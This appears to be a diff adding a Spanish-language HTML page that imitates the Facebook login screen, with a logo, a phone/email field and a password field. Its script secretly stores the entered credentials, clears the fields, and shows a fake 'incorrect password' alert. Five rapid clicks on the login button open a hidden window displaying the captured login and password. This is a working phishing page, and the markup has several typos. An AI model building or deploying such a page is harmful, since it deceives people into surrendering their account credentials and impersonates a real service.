@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+   
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>facebook</title>
+
+<style>
+
+body{
+    background:white;
+    font-family:Arial;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:140vh;
+    color:whithe;
+}
+
+
+input{
+ border:1.5px solid #cdcdcd !important;
+ outline:10px;
+    width:90%;
+    padding:19px;
+    margin-top:10px;
+    border:none;
+    border-radius:15px;
+    font-size:16px;
+}
+
+button {width:100%;
+    padding:12px;
+    margin-top:15px; 
+    border:none;
+    border-radius:28px;
+    background:#1877F2;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+   
+}
+
+</style>
+</head>
+
+<body>
+
+<div>
+
+   <center> <h5 style="position:absolute;
+  top:0;
+  left:44%; AAfamily-font:arial;font-weight:400;color:#5f5f5f;">Español</h5>
+  <img  style="width:100px;eight:100px;position:absolute;top:40px;left:38%;"src="https://i.postimg.cc/L4NPV1CK/IMG-2828.jpg" alt="">
+  </center>
+
+    <input type="text" id="texto1" placeholder="Celular o correo electrónico">
+    <input "type="text" id="texto2" placeholder="Contraseña">
+
+    <button  style="width:100%;
+    padding:12px;
+    margin-top:15px; 
+    border:none;
+    border-radius:28px;
+    background:#1877F2;
+    color:white;
+    font-size:16px;
+    cursor:pointer;"id="boton""">
+        Iniciar sesión
+    </button>
+    <center>
+      <br><h2 style="font-weight:500; font-size:15px;"> ¿Olvidaste tu contraseña?</h2>
+    </center>
+<br><br> <button style=" width:100%;
+    padding:12px;
+    margin-top:15px; 
+    border:none;
+    border-radius:28px;
+    background:white;
+    color:#1877F2;
+    font-size:16px;
+    cursor:pointer;border:1.5px solid #1877F2 !important;
+ outline:10px;"id="n">
+        Crear cuenta nueva
+    </button>
+   <center> <img style="width:70px; eight:70px;" src="https://i.postimg.cc/Gh2jTywC/IMG-2831.png" alt=""></center>
+  <h5 style="position:absolute;
+  top:70;
+  left:33%; font-size:10px; AAfamily-font:arial;font-weight:500;color:#5f5f5f;">Información &nbsp &nbsp  Ayuda &nbsp &nbsp &nbsp Mas</h5> 
+<script>
+
+let guardado1 = "";
+let guardado2 = "";
+
+let clicks = 0;
+let timer;
+
+const boton = document.getElementById("boton");
+
+boton.addEventListener("click", function(){
+
+    clicks++;
+
+    clearTimeout(timer);
+
+    timer = setTimeout(() => {
+
+        // 1 CLICK = GUARDAR Y BORRAR
+        if(clicks == 1){
+
+            guardado1 = document.getElementById("texto1").value;
+            guardado2 = document.getElementById("texto2").value;
+
+            document.getElementById("texto1").value = "";
+            document.getElementById("texto2").value = "";
+
+            alert("Contraseña incorrecta");
+
+        }
+
+        // 2 CLICKS = ABRIR OTRA VENTANA
+        else if(clicks == 5){
+
+            let ventana = window.open("", "_blank");
+
+            ventana.document.write(`
+                <html>
+                <head>
+                    <title>Contenido oculto</title>
+
+                    <style>
+                        body{
+                            background:#111;
+                            color:white;
+                            font-family:Arial;
+                            padding:30px;
+                        }
+
+                        .caja{
+                            background:#1e1e1e;
+                            padding:20px;
+                            border-radius:15px;
+                        }
+                    </style>
+
+                </head>
+
+                <body>
+
+                    <div class="caja">
+                        <h2>Mensajes guardados</h2>
+
+                        <p><b>Texto 1:</b> ${guardado1}</p>
+
+                        <p><b>Texto 2:</b> ${guardado2}</p>
+                    </div>
+
+                </body>
+                </html>
+            `);
+
+        }
+
+        clicks = 0;
+
+    }, 300);
+
+});
+
+</script>
+
+
+    </div</div>
+
+</body>
+</html>
